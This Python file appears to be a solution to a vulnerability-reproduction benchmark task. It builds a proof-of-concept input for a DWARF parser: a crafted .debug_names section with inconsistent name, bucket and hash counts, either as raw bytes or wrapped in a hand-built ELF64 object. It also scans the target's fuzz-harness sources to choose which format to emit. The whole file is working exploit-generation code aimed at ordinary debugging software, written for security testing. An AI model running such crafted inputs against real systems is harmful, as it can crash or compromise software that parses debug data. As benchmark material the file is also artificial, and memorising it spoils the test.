import os
import tarfile
from typing import Optional, Tuple


def _u16(x: int) -> bytes:
    return int(x & 0xFFFF).to_bytes(2, "little", signed=False)


def _u32(x: int) -> bytes:
    return int(x & 0xFFFFFFFF).to_bytes(4, "little", signed=False)


def _u64(x: int) -> bytes:
    return int(x & 0xFFFFFFFFFFFFFFFF).to_bytes(8, "little", signed=False)


def _align(off: int, a: int) -> int:
    if a <= 1:
        return off
    r = off % a
    return off if r == 0 else off + (a - r)


def _build_debug_names_unit(name_count: int = 94, bucket_count: int = 2, comp_unit_count: int = 1) -> bytes:
    if name_count <= 0:
        name_count = 1
    if bucket_count <= 0:
        bucket_count = 1
    if comp_unit_count < 0:
        comp_unit_count = 0

    version = 5
    padding = 0
    local_type_unit_count = 0
    foreign_type_unit_count = 0
    abbrev_table_size = 1
    augmentation = b"\x00"

    body = bytearray()
    body += _u16(version)
    body += _u16(padding)
    body += _u32(comp_unit_count)
    body += _u32(local_type_unit_count)
    body += _u32(foreign_type_unit_count)
    body += _u32(bucket_count)
    body += _u32(name_count)
    body += _u32(abbrev_table_size)
    body += augmentation

    # comp_unit_offsets (DWARF32 offsets)
    for _ in range(comp_unit_count):
        body += _u32(0)

    # local_type_unit_offsets: none
    # foreign_type_unit_signatures: none

    # buckets (1-based indices; 0 means empty)
    # Make bucket[0] start at 1, bucket[1] start at last index, others 0.
    buckets = [0] * bucket_count
    if bucket_count >= 1:
        buckets[0] = 1
    if bucket_count >= 2:
        buckets[1] = name_count  # 1-based index of last entry
    for b in buckets:
        body += _u32(b)

    # hash_table (name_count entries)
    # Create values that group by bucket to avoid pathological scans.
    # First (name_count-1) entries: increasing even hashes, last entry: large odd.
    for i in range(max(0, name_count - 1)):
        body += _u32((i * 2) & 0xFFFFFFFF)
    if name_count >= 1:
        body += _u32(1000001)

    # string_offsets (offsets into .debug_str)
    body += b"\x00" * (4 * name_count)

    # entry_offsets (offsets into entry pool)
    body += b"\x00" * (4 * name_count)

    # abbrev table (size 1): single 0 to terminate
    body += b"\x00"

    # entry pool: single 0 abbrev code to terminate
    body += b"\x00"

    unit_length = len(body)
    return _u32(unit_length) + bytes(body)


def _build_raw_debug_names() -> bytes:
    return _build_debug_names_unit(name_count=94, bucket_count=2, comp_unit_count=1)


def _build_elf_with_sections(sections: Tuple[Tuple[str, bytes, int, int], ...]) -> bytes:
    # sections: (name, data, sh_type, sh_flags) excluding the mandatory null and .shstrtab
    # Build ELF64 LE ET_REL with SHT.
    shstr = bytearray(b"\x00")
    name_offsets = {}
    for nm, _, _, _ in ((".shstrtab", b"", 3, 0),) + tuple((s[0], b"", 0, 0) for s in sections):
        if nm not in name_offsets:
            name_offsets[nm] = len(shstr)
            shstr += nm.encode("ascii", "ignore") + b"\x00"

    # Layout: ELF header + shstrtab + section datas + section header table
    ehdr_size = 64
    off = ehdr_size

    shstrtab_data = bytes(shstr)
    shstrtab_off = off
    off += len(shstrtab_data)

    sect_layout = []
    for nm, data, sh_type, sh_flags in sections:
        s_off = off
        off += len(data)
        sect_layout.append((nm, data, sh_type, sh_flags, s_off, len(data)))

    shoff = _align(off, 8)
    pad = shoff - off
    off = shoff

    shentsize = 64
    shnum = 1 + 1 + len(sections)  # null + shstrtab + others
    shstrndx = 1
    file_size = shoff + shnum * shentsize

    out = bytearray(b"\x00" * file_size)

    # ELF header
    e_ident = bytearray(16)
    e_ident[0:4] = b"\x7fELF"
    e_ident[4] = 2  # ELFCLASS64
    e_ident[5] = 1  # little
    e_ident[6] = 1  # version
    e_ident[7] = 0  # SYSV
    # rest zeros
    out[0:16] = e_ident
    # e_type, e_machine, e_version, e_entry, e_phoff, e_shoff, e_flags, e_ehsize, e_phentsize, e_phnum, e_shentsize, e_shnum, e_shstrndx
    hdr = bytearray()
    hdr += _u16(1)          # ET_REL
    hdr += _u16(62)         # EM_X86_64
    hdr += _u32(1)          # EV_CURRENT
    hdr += _u64(0)          # e_entry
    hdr += _u64(0)          # e_phoff
    hdr += _u64(shoff)      # e_shoff
    hdr += _u32(0)          # e_flags
    hdr += _u16(ehdr_size)  # e_ehsize
    hdr += _u16(0)          # e_phentsize
    hdr += _u16(0)          # e_phnum
    hdr += _u16(shentsize)  # e_shentsize
    hdr += _u16(shnum)      # e_shnum
    hdr += _u16(shstrndx)   # e_shstrndx
    out[16:16 + len(hdr)] = hdr

    # Write shstrtab
    out[shstrtab_off:shstrtab_off + len(shstrtab_data)] = shstrtab_data

    # Write section data
    for nm, data, _, _, s_off, s_sz in sect_layout:
        out[s_off:s_off + s_sz] = data

    if pad:
        out[shoff - pad:shoff] = b"\x00" * pad

    def _shdr(sh_name: int, sh_type: int, sh_flags: int, sh_addr: int, sh_offset: int, sh_size: int,
              sh_link: int, sh_info: int, sh_addralign: int, sh_entsize: int) -> bytes:
        # Elf64_Shdr: IIQQQQIIQQ
        b = bytearray()
        b += _u32(sh_name)
        b += _u32(sh_type)
        b += _u64(sh_flags)
        b += _u64(sh_addr)
        b += _u64(sh_offset)
        b += _u64(sh_size)
        b += _u32(sh_link)
        b += _u32(sh_info)
        b += _u64(sh_addralign)
        b += _u64(sh_entsize)
        return bytes(b)

    # Section headers
    shpos = shoff
    # [0] null
    out[shpos:shpos + shentsize] = b"\x00" * shentsize
    shpos += shentsize
    # [1] .shstrtab
    out[shpos:shpos + shentsize] = _shdr(
        name_offsets[".shstrtab"],
        3,  # SHT_STRTAB
        0,
        0,
        shstrtab_off,
        len(shstrtab_data),
        0,
        0,
        1,
        0
    )
    shpos += shentsize
    # others
    for nm, data, sh_type, sh_flags, s_off, s_sz in sect_layout:
        out[shpos:shpos + shentsize] = _shdr(
            name_offsets.get(nm, 0),
            sh_type,
            sh_flags,
            0,
            s_off,
            s_sz,
            0,
            0,
            1,
            0
        )
        shpos += shentsize

    return bytes(out)


def _build_elf_poc() -> bytes:
    debug_names = _build_debug_names_unit(name_count=94, bucket_count=2, comp_unit_count=1)
    debug_str = b"\x00"
    sections = (
        (".debug_names", debug_names, 1, 0),  # SHT_PROGBITS
        (".debug_str", debug_str, 1, 0),
    )
    return _build_elf_with_sections(sections)


def _iter_source_files_from_tar(src_path: str, max_files: int = 4000, max_size: int = 600_000):
    try:
        with tarfile.open(src_path, "r:*") as tf:
            count = 0
            for m in tf:
                if count >= max_files:
                    break
                if not m.isreg():
                    continue
                n = m.name.lower()
                if not (n.endswith(".c") or n.endswith(".cc") or n.endswith(".cpp") or n.endswith(".cxx")):
                    continue
                if m.size <= 0 or m.size > max_size:
                    continue
                f = tf.extractfile(m)
                if not f:
                    continue
                try:
                    data = f.read()
                finally:
                    f.close()
                count += 1
                yield m.name, data
    except Exception:
        return


def _iter_source_files_from_dir(src_dir: str, max_files: int = 4000, max_size: int = 600_000):
    count = 0
    for root, _, files in os.walk(src_dir):
        for fn in files:
            if count >= max_files:
                return
            lfn = fn.lower()
            if not (lfn.endswith(".c") or lfn.endswith(".cc") or lfn.endswith(".cpp") or lfn.endswith(".cxx")):
                continue
            p = os.path.join(root, fn)
            try:
                st = os.stat(p)
                if st.st_size <= 0 or st.st_size > max_size:
                    continue
                with open(p, "rb") as f:
                    data = f.read()
            except Exception:
                continue
            count += 1
            yield p, data


def _detect_raw_debug_names_input(src_path: str) -> bool:
    # Heuristic: if the fuzz target constructs a Dwarf_Obj_Access_Interface with a section named ".debug_names"
    # and points section_data/section_size to the fuzz input, it likely expects raw section bytes rather than ELF.
    best = None  # (score, content)
    debug_kw = (b"debug_names", b"debugnames", b".debug_names")
    fuzzer_kw = (b"LLVMFuzzerTestOneInput", b"FuzzerTestOneInput")

    it = _iter_source_files_from_dir(src_path) if os.path.isdir(src_path) else _iter_source_files_from_tar(src_path)
    if it is None:
        return False

    for _, data in it:
        if not any(k in data for k in fuzzer_kw):
            continue
        if not any(k in data for k in debug_kw):
            continue
        score = 0
        score += 10 if b".debug_names" in data else 0
        score += 10 if b"Dwarf_Obj_Access_Interface" in data else 0
        score += 5 if b"section_data" in data else 0
        score += 5 if b"section_size" in data else 0
        score += 5 if b"section_name" in data else 0
        score += 5 if b"obj_access" in data else 0
        score += 5 if b"FuzzedDataProvider" in data else 0
        score -= 8 if (b"elf_memory" in data or b"elf_begin" in data or b"dwarf_elf" in data) else 0
        score += 8 if b"dwarf_object_init_b" in data else 0
        score += 3 if b"dwarf_init" in data else 0  # ambiguous
        if best is None or score > best[0]:
            best = (score, data)

    if best is None:
        return False

    data = best[1]
    if b".debug_names" not in data:
        return False

    looks_like_raw = (
        (b"Dwarf_Obj_Access_Interface" in data or b"Obj_Access_Interface" in data) and
        (b"section_data" in data or b"section_bytes" in data) and
        (b"section_size" in data) and
        (b".debug_names" in data) and
        not (b"elf_begin" in data or b"elf_memory" in data or b"dwarf_elf" in data)
    )
    return bool(looks_like_raw)


class Solution:
    def solve(self, src_path: str) -> bytes:
        raw_mode = _detect_raw_debug_names_input(src_path)
        if raw_mode:
            return _build_raw_debug_names()
        return _build_elf_poc()